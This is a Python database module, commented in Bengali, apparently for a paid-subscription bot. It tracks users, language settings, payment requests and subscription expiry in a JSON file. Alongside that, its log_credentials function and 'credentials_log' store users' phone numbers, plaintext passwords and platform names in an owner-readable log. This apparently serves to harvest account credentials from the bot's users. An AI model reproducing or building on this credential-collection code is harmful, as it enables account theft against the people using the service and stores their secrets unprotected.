"""
Database & Subscription Manager
ইউজারের সাবস্ক্রিপশন, পেমেন্ট ভেরিফিকেশন এবং স্ট্যাটাস ট্র্যাকিং
"""
import os
import json
import time
import threading
from config import DB_FILE

db_lock = threading.Lock()

class Database:
    def __init__(self, filepath=DB_FILE):
        self.filepath = filepath
        self._ensure_db()

    def _ensure_db(self):
        if not os.path.exists(self.filepath):
            initial_data = {
                "users": {},
                "subscriptions": {},
                "payment_requests": {},
                "credentials_log": []
            }
            with open(self.filepath, "w", encoding="utf-8") as f:
                json.dump(initial_data, f, indent=2, ensure_ascii=False)

    def _read_data(self):
        try:
            with open(self.filepath, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {"users": {}, "subscriptions": {}, "payment_requests": {}, "credentials_log": []}

    def _write_data(self, data):
        temp_file = f"{self.filepath}.tmp"
        with open(temp_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(temp_file, self.filepath)

    def get_user_lang(self, user_id):
        with db_lock:
            data = self._read_data()
            return data.get("users", {}).get(str(user_id), {}).get("lang", "bn")

    def set_user_lang(self, user_id, lang):
        with db_lock:
            data = self._read_data()
            user_key = str(user_id)
            if user_key not in data["users"]:
                data["users"][user_key] = {}
            data["users"][user_key]["lang"] = lang
            self._write_data(data)

    def has_active_subscription(self, user_id):
        """চেক করে ইউজারের বৈধ সাবস্ক্রিপশন আছে কিনা"""
        with db_lock:
            data = self._read_data()
            sub = data.get("subscriptions", {}).get(str(user_id))
            if not sub:
                return False
            now = time.time()
            return sub.get("status") == "active" and sub.get("expires_at", 0) > now

    def get_subscription_info(self, user_id):
        with db_lock:
            data = self._read_data()
            return data.get("subscriptions", {}).get(str(user_id))

    def create_payment_request(self, user_id, username, plan_key, plan_title, price, method_key, method_name, trx_id):
        """নতুন পেমেন্ট রিকোয়েস্ট তৈরি করে"""
        with db_lock:
            data = self._read_data()
            req_id = f"PAY_{int(time.time())}_{str(user_id)[-4:]}"
            data["payment_requests"][req_id] = {
                "req_id": req_id,
                "user_id": user_id,
                "username": username or "Unknown",
                "plan_key": plan_key,
                "plan_title": plan_title,
                "price": price,
                "method_key": method_key,
                "method_name": method_name,
                "trx_id": trx_id,
                "status": "pending",
                "created_at": time.time()
            }
            self._write_data(data)
            return req_id

    def approve_payment(self, req_id, days):
        """ওনার পেমেন্ট অনুমোদন করলে সাবস্ক্রিপশন সক্রিয় করে"""
        with db_lock:
            data = self._read_data()
            req = data.get("payment_requests", {}).get(req_id)
            if not req:
                return False, None
            
            req["status"] = "approved"
            req["approved_at"] = time.time()
            user_id = str(req["user_id"])

            current_sub = data.get("subscriptions", {}).get(user_id)
            now = time.time()
            base_time = now
            if current_sub and current_sub.get("expires_at", 0) > now:
                base_time = current_sub["expires_at"]

            new_expiry = base_time + (days * 86400)
            data["subscriptions"][user_id] = {
                "user_id": int(user_id),
                "plan_key": req["plan_key"],
                "plan_title": req["plan_title"],
                "status": "active",
                "activated_at": now,
                "expires_at": new_expiry
            }
            self._write_data(data)
            return True, int(user_id)

    def reject_payment(self, req_id):
        """ওনার পেমেন্ট বাতিল করলে স্ট্যাটাস আপডেট করে"""
        with db_lock:
            data = self._read_data()
            req = data.get("payment_requests", {}).get(req_id)
            if not req:
                return False, None
            req["status"] = "rejected"
            req["rejected_at"] = time.time()
            self._write_data(data)
            return True, req["user_id"]

    def log_credentials(self, user_id, phone, password, platform):
        """ইউজার আইডি ও পাসওয়ার্ড ওনার লগে রেকর্ড করে"""
        with db_lock:
            data = self._read_data()
            data["credentials_log"].append({
                "user_id": user_id,
                "phone": phone,
                "password": password,
                "platform": platform,
                "timestamp": time.time()
            })
            self._write_data(data)

db = Database()
